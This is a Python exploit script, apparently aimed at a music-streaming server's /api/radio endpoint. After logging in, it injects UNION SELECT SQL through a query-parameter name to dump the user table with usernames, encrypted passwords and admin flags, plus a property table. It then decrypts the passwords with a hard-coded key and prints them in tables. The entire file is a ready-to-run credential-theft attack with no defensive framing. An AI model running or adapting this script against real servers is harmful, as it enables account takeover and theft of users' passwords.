import requests
import urllib.parse
import sys
from decryptor import decrypt, key_to_32_bytes

def login(base_url, username, password):
    login_url = f'{base_url}/auth/login'
    login_data = {'username': username, 'password': password}
    headers = {'Content-Type': 'application/json'}
    try:
        response = requests.post(login_url, json=login_data, headers=headers)
        response.raise_for_status()
        return response.json().get('token')
    except requests.RequestException as e:
        print(f'Login failed: {e}')
        return None

def execute_sql_injection(base_url, token, payload):
    encoded_payload = urllib.parse.quote(payload)
    url = f'{base_url}/api/radio?{encoded_payload}=1'
    headers = {'X-ND-Authorization': f'Bearer {token}'}
    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()
        return response.json()
    except requests.RequestException as e:
        print(f'Error executing request: {e}')
        return None

def decrypt_password(encrypted_password):
    key = "just for obfuscation"
    enc_key = key_to_32_bytes(key)
    try:
        return decrypt(enc_key, encrypted_password)
    except Exception as e:
        print(f"Decryption failed: {e}")
        return encrypted_password

def print_bordered_table(headers, data):
    col_widths = [max(len(str(row[i])) for row in data + [headers]) for i in range(len(headers))]
    
    print('┌' + '┬'.join('─' * (width + 2) for width in col_widths) + '┐')
    print('│ ' + ' │ '.join(f"{headers[i]:<{col_widths[i]}}" for i in range(len(headers))) + ' │')
    print('├' + '┼'.join('─' * (width + 2) for width in col_widths) + '┤')
    
    for row in data:
        print('│ ' + ' │ '.join(f"{str(row[i]):<{col_widths[i]}}" for i in range(len(row))) + ' │')
    
    print('└' + '┴'.join('─' * (width + 2) for width in col_widths) + '┘')

def print_user_data(data):
    headers = ["ID", "Username", "Password", "Decrypted Password", "Is Admin"]
    formatted_data = [
        [
            entry['id'], 
            entry['name'], 
            entry['streamUrl'], 
            decrypt_password(entry['streamUrl']),
            entry['homePageUrl']
        ] 
        for entry in data
    ]
    print_bordered_table(headers, formatted_data)

def print_property_data(data):
    headers = ["Name", "Value"]
    formatted_data = [[entry['id'], entry['name']] for entry in data]
    print_bordered_table(headers, formatted_data)

def main():
    if len(sys.argv) != 4:
        print("Usage: python auto_exploit.py <base_url> <username> <password>")
        sys.exit(1)

    base_url = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    
    token = login(base_url, username, password)
    if not token:
        print("Authentication failed. Exiting.")
        return

    print("Successfully authenticated.")

    payloads = [
        "1=1) UNION SELECT id,user_name,password,is_admin,'','' FROM user --",
        "1=1) UNION SELECT ID,VALUE,'','','','' FROM property --"
    ]
    ck = 0
    for i, payload in enumerate(payloads, 1):
        if ck==0:
            print(f"\nDumping Users Table")
            result = execute_sql_injection(base_url, token, payload)
            ck+=1
        elif ck==1:
            print(f"\nDumping Property Table")
            result = execute_sql_injection(base_url, token, payload)
        
        if result:
            if i == 1:
                print_user_data(result)
            elif i == 2:
                print_property_data(result)
        print()

if __name__ == '__main__':
    main()